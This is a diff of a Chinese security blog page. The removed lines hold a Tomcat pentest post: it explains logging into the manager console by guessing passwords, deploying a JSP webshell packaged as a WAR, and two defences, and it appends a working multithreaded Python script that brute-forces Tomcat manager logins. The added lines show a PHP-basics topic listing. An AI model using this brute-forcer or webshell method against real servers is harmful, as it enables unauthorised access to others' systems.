@@ -3,7 +3,7 @@
 <head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tomcat部署War包getshell - Reber's Blog</title>
+  <title>Php - Reber's Blog</title>
   <meta name="keywords" content="渗透测试 漏洞挖掘 web安全 网络安全 python php linux">
   <meta name="description" content="">
   <meta name="author" content="reber">
@@ -74,256 +74,81 @@
     </ul>
 </div>
 
-
+    
     <div class="main">
         <div class="left">
-            <div>
-                <h2>Tomcat部署War包getshell</h2>
-            </div>
+            <h2 style="padding:0px 0px 15px 0px;">-- Php --</h2>
             <div class="content">
                 
-                <div class="post-meta">
-                    <div style="padding:5px 5px 2px 0px;">
-                        <i class="fa fa-calendar fa-fw"></i>
-                        <time>2016-08-02</time>
-                    </div>
-
                     
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
+        <h2><a href="http://wyb0.com/posts/PHP%E4%B9%8B%E5%9F%BA%E7%A1%80/">PHP之基础</a></h2>
 
-                    <div style="padding:2px 5px 5px 0px;">
-                        
-                        
-                        
-                            <i class="fa fa-folder fa-fw"></i>
-                            
-                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                            
-                        
-                        
-                        &nbsp;&nbsp;&nbsp;&nbsp;
-                        
-                        
-                        
-                            <i class="fa fa-tags fa-fw"></i>
-                            
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/pentest">pentest</a>
-                            
-                        
-                        
-                    </div>
-                </div>
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-05-15</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
                 
                 
-
-<h3 id="0x00-关于war包:f7e5681da13019e03db2c75427cd09b8">0x00 关于War包</h3>
-
-<blockquote>
-<pre><code>War包一般是进行Web开发时一个网站Project下的所有代码,包括前台HTML/CSS/JS代码,
-以及Java的代码。当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布
-则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录,当Tomcat
-服务器启动时,War包也会随之被解压后自动部署。
-</code></pre>
-</blockquote>
-
-<h3 id="0x01-上传war包getshell:f7e5681da13019e03db2c75427cd09b8">0x01 上传War包GetShell</h3>
-
-<ul>
-<li><p>找到后台猜密码然后登录
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcat_vul_background.png" alt="Tomcat后台">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcat_vul_login.png" alt="Tomcat后台登录">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcat_vul_war_login_success.png" alt="Tomcat后台登录成功">
-</div>
-</p></li>
-
-<li><p>上传War包<br />
-先将jsp大马压缩为zip，再将zip后缀改名为war，然后上传war包
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcot_vul_put_war.png" alt="Tomcat上传War包">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcot_vul_put_war_success.png" alt="Tomcat上传War包成功">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcot_vul_visit_shell1.png" alt="Tomcat部署War包后访问shell1">
-</div>
-
-<br /><br />
-
-<div class="pure-u-1">
-  <img class="pure-img" src="http://wyb0.com/img/post/tomcot_vul_visit_shell2.png" alt="Tomcat部署War包后访问shell2">
-</div>
-</p></li>
-</ul>
-
-<h3 id="0x02漏洞防御:f7e5681da13019e03db2c75427cd09b8">0x02漏洞防御</h3>
-
-<ul>
-<li>后台使用强密码</li>
-<li>删除Tomcat下的manager文件夹</li>
-</ul>
-
-<h3 id="0x03-附爆破弱口令代码:f7e5681da13019e03db2c75427cd09b8">0x03 附爆破弱口令代码</h3>
-
-<blockquote>
-<pre><code class="language-python">#!/usr/bin/env python
-#-*- coding:utf-8 -*-
-
-import requests
-import json
-import base64
-import sys
-import Queue
-import threading
-
-&quot;&quot;&quot;
-简单爆破后台登陆密码
-Usage: python tomcat.py username.txt password.txt urlfile.txt
-username.txt为用户名字典
-password.txt为密码字典
-urlfile.txt为后台url列表
-&quot;&quot;&quot;
-
-def get_username(userfile):
-    username = []
-    with open(userfile, 'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            username.append(line.strip())
-    return username
-
-def get_pwd(passfile):
-    password = []
-    with open(passfile, 'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            password.append(line.strip())
-    return password
-
-def get_url(urlfile):
-    urllist = Queue.Queue()
-    with open(urlfile,'r') as f:
-        lines = f.readlines()
-        for line in lines:
-            urllist.put(line.strip())
-    return urllist
-
-def thread(f,urls,names,pwds):
-    while not urls.empty():
-        s = requests.Session()
-        url = urls.get()
-        resp = s.get(url,timeout=10)  #用于记录cookie
-        Referer = resp.url
-
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
-            'Referer': Referer,
-        }
-        bgurl = url + 'manager/html'
-        # print bgurl
-        for name in names:
-            for pwd in pwds:
-                authorize = name + ':' + pwd
-                Basic = &quot;Basic &quot; + base64.b64encode(authorize)
-                headers['Authorization'] = Basic
-                # print json.dumps(headers, indent=4)
-
-                proxy = {
-                    'http':'http://127.0.0.1:1080'
-                }
-
-                resp = s.get(bgurl,headers=headers,proxies=proxy,timeout=10)
-                if resp.status_code == 200:
-                    s = &quot;[Ok] %s\t%s:%s&quot; % (bgurl,name,pwd)
-                    print s
-                    f.write(s)
-                    exit()
-                else:
-                    print '[Error] ' + bgurl + '\t' + name + ':' + pwd
-            # break
-
-def main():
-    if len(sys.argv) &lt; 4:
-        print &quot;Usage: python tomcat.py username.txt password.txt urlfile.txt&quot;
-        exit()
-    userfile = sys.argv[1]
-    passfile = sys.argv[2]
-    urlfile = sys.argv[3]
-    names = get_pwd(userfile)
-    pwds = get_pwd(passfile)
-    urls = get_url(urlfile)
-
-    tlist = []
-    f = open(&quot;result.txt&quot;,&quot;a+&quot;)
-    for x in xrange(1,50):
-        t = threading.Thread(target=thread,args=(f,urls,names,pwds,))
-        tlist.append(t)
-    for t in tlist:
-        t.start()
-    t.join()
-
-main()
-</code></pre>
-</blockquote>
-
                 
-                <div style="padding:10px 1px;">
-                    <font color="FF0000">若未作声明则文章版权归本人所有，转载请注明原文链接：</font>
-                    <script>
-                        var link = decodeURI(window.location.href);
-                        var url = '<a href="' + link + '">'+link+'</a>';
-                        document.write(url);
-                    </script>
-                </div>
-
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/php">PHP</a>
+                    
                 
-<div class="prev-next-post pure-g">
-  <div class="pure-u-1-24" style="text-align: left;">
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/php">php</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
     
-    <a href="http://wyb0.com/posts/CGI%E4%B8%8EFastCGI%E4%B8%8EPHP-FPM/"><i class="fa fa-chevron-left"></i></a>
+    <p style="max-height:130px;overflow:hidden;line-height:1.6;position: relative;word-wrap: break-word !important;z-index:1;">
+        PHP的作用 收集表单数据 生成动态网页 字符串处理 动态输出图片 处理服务器端文件系统 编写数据库支持的网页 会话跟踪控制 处理XML文件 支持大量的网络协议 服务器端的其他相关操作 PHP代码嵌入位置 可以将PHP语言嵌入到扩展名为.php的HTML文件中的任何位置，只要在文件中使用&lt;?php起始符和终止符?&gt;就会开启PHP模式。在PHP模式中写入PHP语句即可将PHP语言嵌入到HTML文件中。 解读开始和结束标记 前两种总是可用，第3、4种要在php.ini中开启short_open_tag和asp_tags &lt;?php ?&gt; &lt;script language=&quot;php&quot;&gt;&lt;/script&gt; &lt;? ?&gt; &lt;% %&gt; 指令分割符 php一段代码中除了最后一行不用分号，其他每句都要用分号结束，不过推荐每句都用分号结束 注释 若觉得代码不合适则可以注释，但不要急于删除 注释的目的在于说明程序 注释对调试和编写程序可以起到很好的帮助作用 PHP注释符有：”/**/”、“//”、“#” 空白符 空白符(空格、tab制表符、换行)会被php引擎忽略 变量的声明 其中双引号中的变量可以被解析，单引号中的变量不能被解析 变量名对大小写敏感 变量名开头是字母或下划线 后面跟任意数量的数字、字母、下划线 变量名中间不能有空格 可变变量 &lt;?php $a = 'hello'; $$a = 'world'; //此时$a的值hello就相当于$$a的键 echo &quot;$a $hello&quot;; //输出hello world ?&gt; 引用 &lt;?php $a = 123; $b = $a; $a = 456; //此时$a为456,$b为123 $c = &amp;$b; $b =
+    </p>
+
     
-  </div>
-  <div class="pure-u-10-24">
+    <footer>
+        <a href="http://wyb0.com/posts/PHP%E4%B9%8B%E5%9F%BA%E7%A1%80/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
     
-    <nav class="prev">
-      <a href="http://wyb0.com/posts/CGI%E4%B8%8EFastCGI%E4%B8%8EPHP-FPM/">CGI与FastCGI与PHP-FPM</a>
+</article>
+
+
+                
+
+                
+
+    
+    
+    <nav class="pagination" role="pagination">
+        
+            <a href="http://wyb0.com/topics/php/"><i class="fa fa-chevron-left"></i></a>
+        
+
+        <span>&nbsp;2 / 2&nbsp;</span>
+        
+        
+            <i class="fa fa-chevron-right"></i>
+        
     </nav>
-    
-  </div>
-  <div class="pure-u-2-24">
-    &nbsp;
-  </div>
-  <div class="pure-u-10-24">
-    
-    <nav class="next">
-      <a href="http://wyb0.com/posts/Redis%E7%9A%84%E5%AE%89%E8%A3%85/">Redis的安装</a>
-    </nav>
-    
-  </div>
-  <div class="pure-u-1-24" style="text-align: right;">
-    
-    <a href="http://wyb0.com/posts/Redis%E7%9A%84%E5%AE%89%E8%A3%85/"><i class="fa fa-chevron-right"></i></a>
-    
-  </div>
-</div>
 
 
             </div>
@@ -631,7 +456,7 @@ main()
         </div>
     </div>
 
-    <br>
+    <br><br>
     
 <div class="foot">
     <div class="copyright">
@@ -723,4 +548,3 @@ main()
 
 </body>
 </html>
-
